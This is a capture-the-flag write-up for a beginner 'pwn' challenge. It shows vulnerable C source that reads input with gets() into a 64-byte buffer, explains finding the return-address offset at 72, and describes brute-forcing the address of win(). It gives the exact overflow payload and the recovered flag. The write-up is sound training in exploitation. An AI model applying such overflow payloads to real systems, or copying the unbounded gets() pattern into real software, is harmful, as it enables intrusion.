# Kuiper Belt Relay Core - Pwn (Beginner)

**Event:** CSS CTF 2026  
**Category:** pwn  
**Level:** Beginner (50 points)

## Problem Description

`vuln()` reads input with `gets()` into `char buffer[64]`. `win()` reads and prints the flag, but normal execution does not call it. The objective is to overwrite the return address and call `win()`.

Attached source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("\nYou hijacked the return address!\n");
    printf("Here's your flag:\n");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Error: flag.txt not found on server.\n");
        exit(1);
    }
    char flag[128];
    if (fgets(flag, sizeof(flag), f)) {
        printf("%s\n", flag);
    }
    fclose(f);
    exit(0);
}

void vuln() {
    char buffer[64];
    printf("This program is a simple echo service.\n");
    printf("Enter your message: ");
    gets(buffer);
    printf("You said: %s\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    printf("Goodbye!\n");
    return 0;
}
```

## Initial Analysis

- Buffer memory specification: The `char buffer[64]` array is allocated starting at offset 0 on the stack frame of the `vuln` function.
- Technique for determining the buffer overflow boundary via external interaction (Black-box testing): When transmitting a payload consisting of the string `"A"*71`, the program still operates stably and prints the message `Goodbye!`. However, with the payload `"A"*72`, this message no longer appears, confirming the program has encountered a segmentation fault (crash) before the final print instruction in the `main` function is executed.
- Based on this result, the system affirms the return address is located at **offset 72** (Including 64 bytes for the buffer and 8 bytes for the Base Pointer register - saved RBP).
- The binary is compiled compatible with x86-64 architecture and does not activate the PIE (Position Independent Executable) mechanism. Scanning static addresses is successful and confirms all partitions are within the `0x40xxxx` range.

## Excluded Directions

### Stack leak through the echo output

The payload `b"A"*n + b"%s%s%s..."` did not disclose a useful address. The source uses `printf("You said: %s\n", buffer)` with a fixed format string, so `%s` inside the input is not interpreted as a format specifier.

`gets()` also appends a NUL byte immediately after the input. Printing the buffer with `%s` stops at that byte. This approach did not provide a stack leak, so the solution used the server response to probe candidate addresses instead.

## Exploitation Chain

**Step 1 - Precisely locate the return address boundary.**

Sequentially transmit payloads with incrementing sizes and monitor server responses to find the threshold breaking the `Goodbye!` string printing procedure:

```text
String "A"*64 -> Normal state, response contains "Goodbye!"
String "A"*71 -> Normal state, response contains "Goodbye!"
String "A"*72 -> Abnormal state, only responds with newline character (Lost "Goodbye!")
```

This basis solidifies the conclusion that the return address begins at the 72nd byte limit.

**Step 2 - Oracle-based scanning to extract the `win()` function address.**

Without a local binary to disassemble, probe addresses from `0x401000` to `0x401500` and identify the response from `win()`.

- Payload structure for each test step: `b"A"*72 + low_bytes(addr)` (Little-Endian format, ensuring safety when the NUL character terminates the string).
- Distinguishing sign (Oracle): Based on analyzing whether the server response contains the string "hijacked" or "CSSCTF".

The automated scan results detected the `win()` function exists at address: **0x401216**.

**Step 3 - Exploit Payload Architecture.**

Because address `0x401216` is smaller than the `0x1000000` threshold, the system only requires overwriting the 3 lowest bytes: `0x16 0x12 0x40`.

Completed Payload structure: `b"A"*72 + b"\x16\x12\x40"`.

**Step 4 - Practical testing (Verification).**

The payload was tested in three independent connections. All three called `win()` and returned the flag.

## Flag

Result:
```text
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

## Reproduce

Reproduce:

```bash
python exploit.py
```

System output:
```text
This program is a simple echo service.
Enter your message: You hijacked the return address!
Here's your flag:
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```

## Attached Documents (Files)

- **exploit.py**: Script code coordinating the automated exploit.
- **de.png**: Screenshot containing the original problem description content.
- **analysis/**: Collection of scripts supporting the probing scan and stage analysis process.
